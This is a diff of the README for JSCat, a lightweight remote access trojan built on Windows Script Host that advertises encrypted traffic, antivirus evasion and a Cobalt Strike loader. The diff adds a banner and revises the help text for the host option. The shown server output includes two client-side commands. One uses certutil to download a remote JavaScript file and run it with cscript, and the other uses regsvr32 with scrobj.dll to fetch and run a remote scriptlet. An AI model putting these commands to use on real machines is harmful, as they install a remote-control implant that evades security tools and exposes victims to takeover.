@@ -1,5 +1,15 @@
 # JSCat
-基于Windows Script Host的简单RAT！想法来源于Koadic和JSRat-Py，并不是要做一款功能全面的强大的远控，最终目标是轻量级、流量加密、免杀和CS加载器。
+```bash
+      _    ___     ___             _
+   _ | |  / __|   / __|   __ _    | |_
+  | || |  \__ \  | (__   / _` |   |  _|
+  _\__/   |___/   \___|  \__,_|   _\__|
+_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
+"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
+```
+
+基于Windows Script Host的简单RAT！想法来源于Koadic和JSRat-Py，并不是要做一款功能全面的强大的远控，最终目标是轻量、流量加密、免杀和CS加载器。
+
 
 ### Install
 
@@ -17,7 +27,7 @@ usage: jscat.py [-h] --host HOST [-p PORT] [--new_key] [-s SLEEP_TIME]
 
 optional arguments:
   -h, --help            show this help message and exit
-  --host HOST           host listening ip ,default is 0.0.0.0
+  --host HOST           host foreign ip for host connect
   -p PORT, --port PORT  host listening port,default is 6600
   --new_key             generate new rc4 key to encrypt data
   -s SLEEP_TIME, --sleep_time SLEEP_TIME
@@ -25,8 +35,8 @@ optional arguments:
                         
 ➜  python3 jscat.py --host 172.16.80.1
 [*]server key is FnxYtigYdCcyrXph
-[*]server running in 172.16.80.1:6600...
-
+[*]host connect ip is 172.16.80.1:6600...
+[*]server running in 0.0.0.0:6600...
 [*]Execute in client:
 certutil -urlcache -split -f http://172.16.80.1:6600/init css.js && cscript //nologo css.js
 regsvr32 /s /n /u /i:http://172.16.80.1:6600/file.sct scrobj.dll
